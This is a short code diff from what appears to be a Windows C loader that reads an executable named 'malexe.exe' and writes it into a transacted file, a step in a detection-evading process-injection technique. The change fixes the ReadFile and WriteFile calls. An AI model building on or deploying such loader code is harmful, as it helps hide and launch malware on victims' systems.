@@ -178,16 +178,16 @@ int main(int argc,char *argv[] )
 		return -1;
 	}
 	printf("[+] allocated 0x%x bytes\n", dwFileSize);
-
-	if (FALSE == ReadFile(hExe, buffer, dwFileSize, NULL, NULL))
+	DWORD read = 0;
+	if (FALSE == ReadFile(hExe, buffer, dwFileSize, &read, NULL))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
 	printf("[+] read malexe.exe to buffer\n");
 
-	
-	if (FALSE == WriteFile(hTransactedFile, buffer, dwFileSize, NULL, NULL))
+	DWORD wrote = 0;
+	if (FALSE == WriteFile(hTransactedFile, buffer, dwFileSize, &wrote, NULL))
 
 	{
 		DisplayErrorText(GetLastError());
